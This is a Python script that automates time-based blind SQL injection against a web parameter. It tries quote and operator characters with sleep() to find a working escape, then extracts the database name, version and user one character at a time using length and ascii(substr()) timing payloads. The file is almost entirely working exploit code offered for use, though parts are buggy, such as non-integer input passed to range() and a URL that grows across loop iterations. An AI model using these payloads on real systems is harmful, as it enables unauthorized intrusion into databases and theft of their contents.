#! /usr/bin/env python3

import requests
from requests.models import parse_url
from itertools import count

#function to find the time taken by a request
def time(url):
    r = requests.get(url)
    t = r.elapsed.total_seconds()
    return t

def escape(url,param,list = ["'",'"',')','")',"')","' OR 1 = 1",'" OR 1 = 1',"\\",",","#","/",'.']) :      #code to find the char to break query.
    char = []
    print("Trying to break the query...")
    for i in list:
        url = url+param+"=1"+i+" and sleep(1.5); --+"
        t = time(url)
        if t > 1.5 :
            char.append(i)
            break

    if not char : #checks if the char array is empty or not
        print("Unable to break query with default character set.")
        option = input("Do you want to try out your own character set? [y/n]")
        state = 1
        newchar = []
        while (state == 1 ) :
            if option.lower() == 'y' :
                state = 0
                num = input("Enter number of characters you want to enter : ")
                print("Enter characters : ")
                for i in range(num) :
                    newchar.append(input())
            
                escape(url,param,newchar) #recursive function with the new list of characters

            elif option.lower() == 'n':
                state = 0

    return char[0]

#function to find the length of information
def len_find(char,param,fun,url) :
    i = 0
    state = 1
    while state == 1 :
        payload = url+"?"+param+"=1"+char+" AND if((select length("+fun+") = "+str(i)+"),sleep(7),null) --+"
        t = time(payload)
        if t > 7 :
            state = 0
            return i
        else : i += 1 

#Function to bruteforce information from the database
def bruteforce(char,param,url):
    functions = ['database()','version()','user()']
    data = {} # dict to store the details
    for f in functions :
        print("Finding length of "+f)
        length = len_find(char,param,f,url)
        temp = '' # temporary var to store the data extracted
        for i in range(length):
            iter = count(start = 32)
            c = next(iter)
            while c < 127 :
                payload = url + "?" + param + "=1"+char+ " AND if(((ascii(substr((select "+f+"),"+str(i+1)+",1))) = "+str(c)+"),sleep(7),null) --+"
                t = time(payload)
                if t > 7 :
                    temp = temp + chr(c)
                    break
                else : c = next(iter)
        data[f]=temp
    for f in functions:
        print(f+": "+data[f])

